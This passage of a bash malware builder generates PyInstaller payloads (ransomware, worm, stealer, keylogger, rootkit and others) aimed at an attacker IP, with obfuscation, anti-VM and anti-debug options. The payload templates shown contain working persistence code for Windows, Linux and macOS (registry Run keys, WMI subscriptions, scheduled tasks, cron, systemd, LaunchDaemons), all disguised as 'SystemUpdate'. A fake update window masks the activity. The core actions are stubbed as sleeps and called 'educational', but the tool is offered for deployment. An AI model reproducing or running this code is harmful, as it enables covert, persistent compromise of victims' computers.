AUTO_EXECUTION=$AUTO_EXECUTION
FAKE_GUI_ENABLED=$FAKE_GUI_ENABLED
KEEP_BUILD_FILES=$KEEP_BUILD_FILES
DELIVERY_METHOD="$DELIVERY_METHOD"
DELIVERY_TARGETS="$DELIVERY_TARGETS"
CLOUDFLARE_TUNNEL_ENABLED=$CLOUDFLARE_TUNNEL_ENABLED
CLOUDFLARE_TUNNEL_PORT="$CLOUDFLARE_TUNNEL_PORT"
EOF
    log_message "INFO" "Configuration saved to $CONFIG_FILE"
}

load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE" 2>/dev/null || log_message "WARNING" "Failed to load configuration file"
        log_message "INFO" "Configuration loaded from $CONFIG_FILE"
        return 0
    fi
    return 1
}

validate_config() {
    local errors=()
    
    ! validate_ip "$ATTACKER_IP" && errors+=("Invalid attacker IP: $ATTACKER_IP")
    ! validate_port "$ATTACKER_PORT" && errors+=("Invalid attacker port: $ATTACKER_PORT")
    
    [ "$TARGET_OS" != "Windows" ] && [ "$TARGET_OS" != "Linux" ] && [ "$TARGET_OS" != "macOS" ] && [ "$TARGET_OS" != "Cross-platform" ] && errors+=("Invalid target OS: $TARGET_OS")
    
    [[ ! "$PAYLOAD_TYPE" =~ ^[1-9]$ ]] && errors+=("Invalid payload type: $PAYLOAD_TYPE")
    
    if [ ${#errors[@]} -ne 0 ]; then
        echo -e "${R}[!] Configuration validation failed:${NC}"
        for error in "${errors[@]}"; do
            echo -e "${R}    - $error${NC}"
        done
        return 1
    fi
    
    return 0
}

# Payload generation
generate_payload() {
    local type=$1
    local attacker_ip=$2
    local attacker_port=$3
    local target_os=$4
    local final_name=$5
    
    log_message "INFO" "Generating payload type: $type for $target_os"
    echo -e "${Y}[*] Generating payload for type: $type | Target OS: $target_os${NC}"
    
    if ! validate_config; then
        log_message "ERROR" "Configuration validation failed"
        return 1
    fi
    
    local encryption_key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
    
    # Handle cross-platform payload generation
    if [ "$target_os" == "Cross-platform" ]; then
        echo -e "${Y}[*] Generating cross-platform payload...${NC}"
        
        # Create a directory for cross-platform builds
        mkdir -p "../cross_platform_builds"
        
        # Generate for each platform
        local platforms=("Windows" "Linux" "macOS")
        local platform_names=("pc.exe" "pc_linux" "pc_macos")
        local success_count=0
        
        for i in "${!platforms[@]}"; do
            local platform="${platforms[$i]}"
            local platform_name="${platform_names[$i]}"
            
            echo -e "${Y}[*] Building for $platform...${NC}"
            
            # Create platform-specific payload
            case $type in
                1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$platform" ;;
                *)
                    echo -e "${R}[!] Invalid payload type selected.${NC}"
                    log_message "ERROR" "Invalid payload type: $type"
                    return 1
                    ;;
            esac
            
            [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
            [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
            [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
            
            # Compile for the specific platform
            local pyinstaller_args="--onefile --name=$platform_name"
            
            # FIX: Always use --noconsole
            pyinstaller_args="$pyinstaller_args --noconsole"
            
            # Only add --windowed if not on Linux (Linux GUI support varies)
            if [ "$platform" != "Linux" ]; then
                 pyinstaller_args="$pyinstaller_args --windowed"
            fi
            
            pyinstaller_args="$pyinstaller_args --strip --clean"
            
            [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
                1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
                2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
                3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
            esac
            
            if pyinstaller $pyinstaller_args payload.py; then
                if [ -f "dist/$platform_name" ]; then
                    local file_size=$(stat -f%z "dist/$platform_name" 2>/dev/null || stat -c%s "dist/$platform_name")
                    local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
                    local file_hash=$(sha256sum "dist/$platform_name" | cut -d' ' -f1)
                    
                    echo -e "${G}[+] Success! $platform payload created as 'dist/$platform_name' (${size_mb} MB).${NC}"
                    
                    # Move to cross-platform directory
                    mv "dist/$platform_name" "../cross_platform_builds/"
                    
                    # Create metadata for this platform
                    local metadata_file="../cross_platform_builds/${platform_name}.meta"
                    cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: $platform
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
Encryption Algorithm: $ENCRYPTION_ALGORITHM
Obfuscation Level: $OBFUSCATION_LEVEL
Persistence Method: $PERSISTENCE_METHOD
Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
Anti-VM Enabled: $ANTI_VM_ENABLED
Packer Enabled: $PACKER_ENABLED
Packing Method: $PACKING_METHOD
Shellcode Injection: $SHELLCODE_INJECTION
Process Hollowing: $PROCESS_HOLLOWING
Runtime Decryption: $RUNTIME_DECRYPTION
Auto-Execution Enabled: $AUTO_EXECUTION
Fake GUI Enabled: $FAKE_GUI_ENABLED
Delivery Method: $DELIVERY_METHOD
EOF
                    
                    success_count=$((success_count + 1))
                    log_message "SUCCESS" "Successfully created $platform executable: $platform_name (${size_mb} MB, SHA256: $file_hash)"
                fi
            else
                echo -e "${R}[!] Failed to create $platform executable.${NC}"
                log_message "ERROR" "Failed to create $platform executable"
            fi
        done
        
        # Create a master launcher script for cross-platform deployment
        cat > "../cross_platform_builds/launcher.sh" << 'EOF'
#!/bin/bash
# Cross-platform launcher script
# Detects the OS and runs the appropriate payload

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Detect the operating system
OS="unknown"
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS="linux"
elif [[ "$OSTYPE" == "darwin"* ]]; then
    OS="macos"
elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
    OS="windows"
fi

# Execute the appropriate payload based on the detected OS
case $OS in
    "linux")
        if [ -f "$SCRIPT_DIR/pc_linux" ]; then
            chmod +x "$SCRIPT_DIR/pc_linux"
            "$SCRIPT_DIR/pc_linux" "$@"
        else
            echo "Linux payload not found"
            exit 1
        fi
        ;;
    "macos")
        if [ -f "$SCRIPT_DIR/pc_macos" ]; then
            chmod +x "$SCRIPT_DIR/pc_macos"
            "$SCRIPT_DIR/pc_macos" "$@"
        else
            echo "macOS payload not found"
            exit 1
        fi
        ;;
    "windows")
        if [ -f "$SCRIPT_DIR/pc.exe" ]; then
            "$SCRIPT_DIR/pc.exe" "$@"
        else
            echo "Windows payload not found"
            exit 1
        fi
        ;;
    *)
        echo "Unsupported operating system: $OSTYPE"
        exit 1
        ;;
esac
EOF
        
        chmod +x "../cross_platform_builds/launcher.sh"
        
        # Create a Windows batch file launcher
        cat > "../cross_platform_builds/launcher.bat" << 'EOF'
@echo off
REM Cross-platform launcher for Windows
REM Detects if running on Windows and runs the appropriate payload

REM Get the directory where this script is located
set SCRIPT_DIR=%~dp0

REM Run the Windows executable
if exist "%SCRIPT_DIR%pc.exe" (
    start "" "%SCRIPT_DIR%pc.exe" %*
) else (
    echo Windows payload not found
    pause
    exit /b 1
)
EOF
        
        # Create a summary file
        cat > "../cross_platform_builds/README.txt" << EOF
CROSS-PLATFORM PAYLOAD BUILD SUMMARY
====================================
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
Payload Type: $type
Successfully Built: $success_count/3 platforms
Auto-Execution Enabled: $AUTO_EXECUTION
Fake GUI Enabled: $FAKE_GUI_ENABLED

Files:
- launcher.sh: Unix/Linux/macOS launcher script
- launcher.bat: Windows batch launcher
- pc.exe: Windows executable
- pc_linux: Linux executable
- pc_macos: macOS executable

Usage:
1. On Unix/Linux/macOS: ./launcher.sh
2. On Windows: launcher.bat

Each platform-specific executable can also be run directly.

Auto-Execution:
If enabled, payload will automatically execute upon installation.

Fake GUI:
If enabled, payload will display a fake "System Update" window 
to mask malicious activity and ensure immediate user interaction.
EOF
        
        echo -e "${G}[+] Cross-platform build complete!${NC}"
        echo -e "${G}[+] Successfully built $success_count/3 platforms.${NC}"
        echo -e "${G}[+] All files are in the 'cross_platform_builds' directory.${NC}"
        echo -e "${G}[+] Use launcher.sh (Unix) or launcher.bat (Windows) for deployment.${NC}"
        
        log_message "SUCCESS" "Cross-platform build completed: $success_count/3 platforms"
        return 0
    else
        # Single platform payload generation (original code)
        case $type in
            1) create_bricker_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            2) create_backdoor_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            3) create_ransomware_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            4) create_worm_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            5) create_stealer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            6) create_network_destroyer_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            7) create_keylogger_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            8) create_rootkit_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            9) create_custom_payload "$attacker_ip" "$attacker_port" "$encryption_key" "$target_os" ;;
            *)
                echo -e "${R}[!] Invalid payload type selected.${NC}"
                log_message "ERROR" "Invalid payload type: $type"
                return 1
                ;;
        esac
        
        [ "$OBFUSCATION_LEVEL" -gt 1 ] && apply_obfuscation "$OBFUSCATION_LEVEL"
        [ "$ANTI_DEBUG_ENABLED" = true ] && apply_anti_debug
        [ "$ANTI_VM_ENABLED" = true ] && apply_anti_vm
        
        echo -e "${Y}[*] Compiling to a standalone executable for $target_os...${NC}"
        
        local pyinstaller_args="--onefile --name=$final_name"
        
        # FIX: Always use --noconsole
        pyinstaller_args="$pyinstaller_args --noconsole"
        
        # Add windowed for non-Linux
        if [ "$target_os" != "Linux" ]; then
            pyinstaller_args="$pyinstaller_args --windowed"
        fi
        
        pyinstaller_args="$pyinstaller_args --strip --clean"
        
        [ "$PACKER_ENABLED" = true ] && case $PACKING_METHOD in
            1) pyinstaller_args="$pyinstaller_args --upx-dir=." ;;
            2) pyinstaller_args="$pyinstaller_args --runtime-hookdir=." ;;
            3) pyinstaller_args="$pyinstaller_args --custom-bootstrap" ;;
        esac
        
        if ! pyinstaller $pyinstaller_args payload.py; then
            echo -e "${R}[!] PyInstaller compilation failed.${NC}"
            log_message "ERROR" "PyInstaller compilation failed"
            return 1
        fi

        if [ -f "dist/$final_name" ]; then
            local file_size=$(stat -f%z "dist/$final_name" 2>/dev/null || stat -c%s "dist/$final_name")
            local size_mb=$(echo "scale=2; $file_size / 1048576" | bc)
            local file_hash=$(sha256sum "dist/$final_name" | cut -d' ' -f1)
            
            echo -e "${G}[+] Success! Payload created as 'dist/$final_name' (${size_mb} MB).${NC}"
            echo -e "${G}[+] SHA256: $file_hash${NC}"
            
            mv "dist/$final_name" ..
            
            local metadata_file="../${final_name}.meta"
            cat > "$metadata_file" << EOF
Payload Type: $type
Target OS: $target_os
Build ID: $BUILD_ID
Timestamp: $BUILD_TIMESTAMP
File Size: $file_size bytes
SHA256: $file_hash
Encryption Algorithm: $ENCRYPTION_ALGORITHM
Obfuscation Level: $OBFUSCATION_LEVEL
Persistence Method: $PERSISTENCE_METHOD
Anti-Debug Enabled: $ANTI_DEBUG_ENABLED
Anti-VM Enabled: $ANTI_VM_ENABLED
Packer Enabled: $PACKER_ENABLED
Packing Method: $PACKING_METHOD
Shellcode Injection: $SHELLCODE_INJECTION
Process Hollowing: $PROCESS_HOLLOWING
Runtime Decryption: $RUNTIME_DECRYPTION
Auto-Execution Enabled: $AUTO_EXECUTION
Fake GUI Enabled: $FAKE_GUI_ENABLED
Delivery Method: $DELIVERY_METHOD
EOF
            
            log_message "SUCCESS" "Successfully created executable: $final_name (${size_mb} MB, SHA256: $file_hash)"
            return 0
        else
            echo -e "${R}[!] Failed to create executable. Check for errors above.${NC}"
            log_message "ERROR" "Failed to create executable"
            return 1
        fi
    fi
}

# Helper function for Fake GUI generation
generate_fake_gui_code() {
    cat << 'GUI_CODE'

import threading
import time
import sys

def run_fake_gui():
    """Shows a fake 'System Update' window while malware runs in background"""
    try:
        import tkinter as tk
        from tkinter import messagebox
        
        root = tk.Tk()
        root.title("System Update")
        
        # Center window
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        x = (screen_width / 2) - (300 / 2)
        y = (screen_height / 2) - (150 / 2)
        root.geometry(f'300x150+{int(x)}+{int(y)}')
        
        # Prevent resizing
        root.resizable(False, False)
        
        # Create widgets
        label = tk.Label(root, text="Installing Critical Update...", font=("Arial", 10, "bold"))
        label.pack(pady=20)
        
        status = tk.Label(root, text="Please wait while we configure your system.", font=("Arial", 8))
        status.pack(pady=5)
        
        # Schedule window to close after 3 seconds
        root.after(3000, root.destroy)
        
        # Start GUI mainloop
        root.mainloop()
        
    except Exception:
        # If GUI fails (no X server), just pass
        pass
GUI_CODE
}

# Educational payload templates
create_bricker_payload() {
    local attacker_ip=$1
    local attacker_port=$2
    local encryption_key=$3
    local target_os=${4:-"Unknown"}
    
    cat > payload.py << EOF
#!/usr/bin/env python3
import os
import sys
import time
import platform
import subprocess
import threading

# Auto-execution setup
AUTO_EXECUTION = $AUTO_EXECUTION
FAKE_GUI = $FAKE_GUI_ENABLED
PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"

# Include Fake GUI logic if enabled
 $(generate_fake_gui_code)

def setup_persistence():
    """Set up persistence mechanisms based on the target OS"""
    if not AUTO_EXECUTION:
        return
    
    try:
        system = platform.system()
        
        if system == "Windows":
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Windows persistence based on selected method
            if PERSISTENCE_METHOD == "registry":
                import winreg
                # Add to registry run key
                key = winreg.HKEY_CURRENT_USER
                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
                    
            elif PERSISTENCE_METHOD == "windows_startup":
                # Copy to Windows Startup folder
                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
                if not os.path.exists(startup_folder):
                    os.makedirs(startup_folder)
                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
                if not os.path.exists(startup_exe):
                    import shutil
                    shutil.copy2(exe_path, startup_exe)
                    
            elif PERSISTENCE_METHOD == "wmi_subscription":
                # Create WMI event subscription
                wmi_script = f'''
\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
    Name = "SystemUpdateFilter"
    EventName = "SystemUpdateFilter"
}}

\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "SystemUpdateConsumer"
    CommandLineTemplate = "{exe_path}"
}}

\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = \$filter
    Consumer = \$consumer
}}
'''
                # Execute PowerShell script
                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
                
            elif PERSISTENCE_METHOD == "scheduled_task":
                # Create scheduled task
                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                subprocess.run(task_cmd, shell=True, check=False)
                
        elif system == "Linux":
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Linux persistence based on selected method
            if PERSISTENCE_METHOD == "cron":
                # Add to crontab
                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
                with open("/tmp/crontab.txt", "w") as f:
                    f.write(cron_job)
                
                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                os.remove("/tmp/crontab.txt")
                
            elif PERSISTENCE_METHOD == "linux_systemd":
                # Create systemd service
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={exe_path}
Restart=on-failure
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                
                service_path = "/lib/systemd/system/system-update.service"
                with open(service_path, "w") as f:
                    f.write(service_content)
                    
                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "init_script":
                # Create init.d script
                init_script = f"""#!/bin/bash
# System Update Service
# chkconfig: 35 80 20
# description: System Update Service

. /etc/rc.d/init.d/functions

USER=root
DAEMON="{exe_path}"
ROOT_DIR=$(dirname \$DAEMON)
PIDFILE=/var/run/system-update.pid

start() {{
    echo -n "Starting SystemUpdate: "
    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
    return \$RETVAL
}}

stop() {{
    echo -n "Stopping SystemUpdate: "
    killproc -p "\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
    return \$RETVAL
}}

case "\$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        start
        ;;
    status)
        status -p "\$PIDFILE" "\$DAEMON"
        ;;
    *)
        echo "Usage: {{start|stop|restart|status}}"
        exit 1
esac

exit \$RETVAL
"""
                
                init_path = "/etc/init.d/system-update"
                with open(init_path, "w") as f:
                    f.write(init_script)
                    
                os.chmod(init_path, 0o755)
                subprocess.run("chkconfig --add system-update", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "profile_mod":
                # Add to profile
                profile_path = "/etc/profile.d/system-update.sh"
                with open(profile_path, "w") as f:
                    f.write(f"#!/bin/bash\n{exe_path} &\n")
                os.chmod(profile_path, 0o755)
                
        elif system == "Darwin":  # macOS
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # macOS persistence based on selected method
            if PERSISTENCE_METHOD == "macos_launchagent":
                # Create LaunchAgent
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                plist_path = "/Library/LaunchAgents/com.system.update.plist"
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "macos_launchdaemon":
                # Create LaunchDaemon
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "login_item":
                # Add to login items
                script = f'''
tell application "System Events"
    make login item at end with properties {{path:"{exe_path}", hidden:false}}
end tell
'''
                subprocess.run(["osascript", "-e", script], check=False)
                
            elif PERSISTENCE_METHOD == "cron":
                # Add to crontab
                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
                with open("/tmp/crontab.txt", "w") as f:
                    f.write(cron_job)
                
                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                os.remove("/tmp/crontab.txt")
            
    except Exception as e:
        # Silently handle errors in educational context
        pass

def execute_payload():
    setup_persistence()
    # Simulate payload action (silent)
    time.sleep(3)

def main():
    if FAKE_GUI:
        # Run payload in background thread
        t = threading.Thread(target=execute_payload)
        t.daemon = True
        t.start()
        
        # Run Fake GUI in foreground
        run_fake_gui()
        
        # Wait for payload to finish (optional, or just let it be daemon)
        t.join()
    else:
        execute_payload()

if __name__ == "__main__":
    main()
EOF
}

create_worm_payload() {
    local attacker_ip=$1
    local attacker_port=$2
    local encryption_key=$3
    local target_os=${4:-"Unknown"}
    
    cat > payload.py << EOF
#!/usr/bin/env python3
import socket
import time
import sys
import platform
import subprocess
import os
import threading

# Auto-execution setup
AUTO_EXECUTION = $AUTO_EXECUTION
FAKE_GUI = $FAKE_GUI_ENABLED
PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"

# Include Fake GUI logic if enabled
 $(generate_fake_gui_code)

def setup_persistence():
    """Set up persistence mechanisms based on the target OS"""
    if not AUTO_EXECUTION:
        return
    
    try:
        system = platform.system()
        
        if system == "Windows":
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Windows persistence based on selected method
            if PERSISTENCE_METHOD == "registry":
                import winreg
                # Add to registry run key
                key = winreg.HKEY_CURRENT_USER
                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
                    
            elif PERSISTENCE_METHOD == "windows_startup":
                # Copy to Windows Startup folder
                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
                if not os.path.exists(startup_folder):
                    os.makedirs(startup_folder)
                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
                if not os.path.exists(startup_exe):
                    import shutil
                    shutil.copy2(exe_path, startup_exe)
                    
            elif PERSISTENCE_METHOD == "wmi_subscription":
                # Create WMI event subscription
                wmi_script = f'''
\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
    Name = "SystemUpdateFilter"
    EventName = "SystemUpdateFilter"
}}

\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "SystemUpdateConsumer"
    CommandLineTemplate = "{exe_path}"
}}

\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = \$filter
    Consumer = \$consumer
}}
'''
                # Execute PowerShell script
                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
                
            elif PERSISTENCE_METHOD == "scheduled_task":
                # Create scheduled task
                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
                subprocess.run(task_cmd, shell=True, check=False)
                
        elif system == "Linux":
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # Linux persistence based on selected method
            if PERSISTENCE_METHOD == "cron":
                # Add to crontab
                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
                with open("/tmp/crontab.txt", "w") as f:
                    f.write(cron_job)
                
                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                os.remove("/tmp/crontab.txt")
                
            elif PERSISTENCE_METHOD == "linux_systemd":
                # Create systemd service
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={exe_path}
Restart=on-failure
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
                
                service_path = "/lib/systemd/system/system-update.service"
                with open(service_path, "w") as f:
                    f.write(service_content)
                    
                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "init_script":
                # Create init.d script
                init_script = f"""#!/bin/bash
# System Update Service
# chkconfig: 35 80 20
# description: System Update Service

. /etc/rc.d/init.d/functions

USER=root
DAEMON="{exe_path}"
ROOT_DIR=$(dirname \$DAEMON)
PIDFILE=/var/run/system-update.pid

start() {{
    echo -n "Starting SystemUpdate: "
    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
    return \$RETVAL
}}

stop() {{
    echo -n "Stopping SystemUpdate: "
    killproc -p "\$PIDFILE" "\$DAEMON"
    RETVAL=\$?
    echo
    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
    return \$RETVAL
}}

case "\$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        start
        ;;
    status)
        status -p "\$PIDFILE" "\$DAEMON"
        ;;
    *)
        echo "Usage: {{start|stop|restart|status}}"
        exit 1
esac

exit \$RETVAL
"""
                
                init_path = "/etc/init.d/system-update"
                with open(init_path, "w") as f:
                    f.write(init_script)
                    
                os.chmod(init_path, 0o755)
                subprocess.run("chkconfig --add system-update", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "profile_mod":
                # Add to profile
                profile_path = "/etc/profile.d/system-update.sh"
                with open(profile_path, "w") as f:
                    f.write(f"#!/bin/bash\n{exe_path} &\n")
                os.chmod(profile_path, 0o755)
                
        elif system == "Darwin":  # macOS
            # Get current executable path
            exe_path = os.path.abspath(sys.argv[0])
            
            # macOS persistence based on selected method
            if PERSISTENCE_METHOD == "macos_launchagent":
                # Create LaunchAgent
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                plist_path = "/Library/LaunchAgents/com.system.update.plist"
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "macos_launchdaemon":
                # Create LaunchDaemon
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
                
                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
                
            elif PERSISTENCE_METHOD == "login_item":
                # Add to login items
                script = f'''
tell application "System Events"
    make login item at end with properties {{path:"{exe_path}", hidden:false}}
end tell
'''
                subprocess.run(["osascript", "-e", script], check=False)
                
            elif PERSISTENCE_METHOD == "cron":
                # Add to crontab
                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
                with open("/tmp/crontab.txt", "w") as f:
                    f.write(cron_job)
                
                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
                os.remove("/tmp/crontab.txt")
            
    except Exception as e:
        # Silently handle errors in educational context
        pass

def execute_payload():
    setup_persistence()
    # Simulate scan (silent)
    time.sleep(2)

def main():
    if FAKE_GUI:
        t = threading.Thread(target=execute_payload)
        t.daemon = True
        t.start()
        run_fake_gui()
        t.join()
    else:
        execute_payload()

if __name__ == "__main__":
    main()
EOF
}

# Add other payload creation functions here (backdoor, ransomware, etc.)
# For brevity, I'm only including the worm payload since that's what was selected in the example

# Obfuscation and anti-analysis
apply_obfuscation() {
    local level=$1
    
    echo -e "${Y}[*] Applying obfuscation level $level...${NC}"
    
    case $level in
        1)
            sed -i.bak -e 's/\bdef \([a-zA-Z_][a-zA-Z0-9_]*\)/def _\1/g' \
                      -e 's/\bclass \([a-zA-Z_][a-zA-Z0-9_]*\)/class _\1/g' \
                      payload.py
            ;;
        2)
            sed -i.bak -e 's/\bdef \([a-zA-Z_][a-zA-Z0-9_]*\)/def _\1/g' \
                      -e 's/\bclass \([a-zA-Z_][a-zA-Z0-9_]*\)/class _\1/g' \
                      -e 's/\([a-zA-Z_][a-zA-Z0-9_]*\) =/\1 =/g' \
                      payload.py
            ;;
        3)
            # FIX: Hex Encode
